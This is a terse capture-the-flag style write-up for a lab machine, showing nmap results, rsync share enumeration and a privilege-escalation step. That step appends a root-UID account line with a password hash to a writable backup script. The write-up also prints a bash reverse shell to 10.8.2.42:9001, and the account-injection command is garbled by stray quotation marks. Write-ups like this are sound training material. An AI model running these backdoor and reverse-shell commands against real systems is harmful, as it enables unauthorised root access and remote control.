# KEY TAKE AWAYS

* rsync enumeration
* cryptography
* sticky bit priv esc

# NMAP

```
PORT    STATE SERVICE REASON  VERSION
21/tcp  open  ftp     syn-ack vsftpd 3.0.5
22/tcp  open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c1:4d:65:15:d2:ee:59:ef:09:be:45:11:33:ca:9f:af (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC006mm4BiGMW0LwEj6SJJ9adPWKKdaVGKqtckMnkDFv2oDpn+mA6s/xHJYD+k/wC+CsxsZu+Z25BntarwhGQas=
|   256 4f:d1:72:b2:97:72:b8:6a:e4:39:25:e0:05:18:4e:27 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIVkmYKsReUPCRf86fAJoytqWUfPzhIL9c9udtwzOJL0
80/tcp  open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
873/tcp open  rsync   syn-ack (protocol version 31)
```

# RSYNC ENUM

From HackTricks
```
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
```

rsync -av --list-only rsync://$IP/httpd 

# Privilege Escalation

ec“test:$1$GmIHt4zO$7k7JXhnl4OOpYZ5cwUHkg1:0:0:root:/root:/bin/bash”’ >> /usr/local/bin/backup.sh

/usr/local/bin/backup.sh

/bin/bash -i >& /dev/tcp/10.8.2.42/9001 0>&1
